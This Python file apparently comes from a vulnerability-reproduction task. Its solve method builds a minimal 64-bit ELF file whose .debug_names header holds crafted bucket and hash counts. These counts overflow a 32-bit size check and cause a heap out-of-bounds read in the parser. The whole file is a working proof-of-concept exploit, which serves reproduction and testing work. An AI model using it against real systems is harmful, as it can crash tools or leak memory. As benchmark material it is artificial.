import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The vulnerability is a 32-bit integer overflow when calculating the total size
        of the .debug_names index tables. By providing large crafted values for
        `bucket_count` and `hash_count`, the size calculation wraps around to a small
        value, which then passes the subsequent boundary check. The code then
        proceeds to read the index tables using the original large (non-overflowed)
        count values, leading to a massive out-of-bounds read from the heap.

        This PoC constructs a minimal 64-bit ELF file containing a single malicious
        .debug_names section to trigger this vulnerability.
        """
        
        # 1. Craft the malicious .debug_names section content.
        # The section size is kept small to ensure the flawed boundary check passes.
        # The check is roughly `start_ptr + calculated_size > end_ptr`.
        # Due to overflow, `calculated_size` becomes small, so the check is bypassed.
        section_size = 40
        unit_length = section_size - 4  # DWARF length field excludes itself
        version = 5
        padding = 0
        comp_unit_count = 0
        local_tu_count = 0
        foreign_tu_count = 0

        # These values cause the 32-bit size calculation to overflow.
        # The vulnerable code calculates a size based on `4*bucket_count + 12*hash_count`.
        # With these values, `4*0x20000000 + 12*0x20000000` overflows a 32-bit integer,
        # resulting in a small value that passes the security check.
        bucket_count = 0x20000000
        hash_count = 0x20000000

        # Pack the .debug_names header in DWARF32 format (4-byte fields).
        debug_names_data = struct.pack(
            "<LHHLLLLL",
            unit_length,
            version,
            padding,
            comp_unit_count,
            local_tu_count,
            foreign_tu_count,
            bucket_count,
            hash_count
        )
        debug_names_data += b'\x00' * (section_size - len(debug_names_data))

        # 2. Create the Section Header String Table (.shstrtab).
        shstrtab_data = b'\x00.debug_names\x00.shstrtab\x00'

        # 3. Define the ELF file layout and offsets.
        elf_header_size = 64
        debug_names_offset = elf_header_size
        debug_names_size = len(debug_names_data)
        shstrtab_offset = debug_names_offset + debug_names_size
        shstrtab_size = len(shstrtab_data)
        sht_offset = shstrtab_offset + shstrtab_size
        sht_entries = 3  # NULL, .debug_names, .shstrtab

        # 4. Construct the 64-bit ELF Header.
        elf_header = b'\x7fELF\x02\x01\x01' + b'\x00' * 9  # e_ident
        elf_header += struct.pack('<HHIQQQI',
            1,       # e_type (ET_REL)
            62,      # e_machine (EM_X86_64)
            1,       # e_version
            0,       # e_entry
            0,       # e_phoff
            sht_offset, # e_shoff
            0        # e_flags
        )
        elf_header += struct.pack('<HHHHHH',
            elf_header_size, # e_ehsize
            0,       # e_phentsize
            0,       # e_phnum
            64,      # e_shentsize
            sht_entries, # e_shnum
            2        # e_shstrndx (index of .shstrtab section header)
        )

        # 5. Construct the Section Header Table (SHT).
        # NULL Section Header (entry 0)
        null_sh = struct.pack('<IIQQQQIIQQ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)

        # .debug_names Section Header (entry 1)
        debug_names_sh = struct.pack('<IIQQQQIIQQ',
            1,  # sh_name (offset in .shstrtab)
            1,  # sh_type (SHT_PROGBITS)
            0,  # sh_flags
            0,  # sh_addr
            debug_names_offset,
            debug_names_size,
            0,  # sh_link
            0,  # sh_info
            1,  # sh_addralign
            0   # sh_entsize
        )

        # .shstrtab Section Header (entry 2)
        shstrtab_sh = struct.pack('<IIQQQQIIQQ',
            14, # sh_name (offset in .shstrtab)
            3,  # sh_type (SHT_STRTAB)
            0,  # sh_flags
            0,  # sh_addr
            shstrtab_offset,
            shstrtab_size,
            0,  # sh_link
            0,  # sh_info
            1,  # sh_addralign
            0   # sh_entsize
        )

        sht = null_sh + debug_names_sh + shstrtab_sh

        # 6. Assemble the final ELF file.
        poc = elf_header + debug_names_data + shstrtab_data + sht
        return poc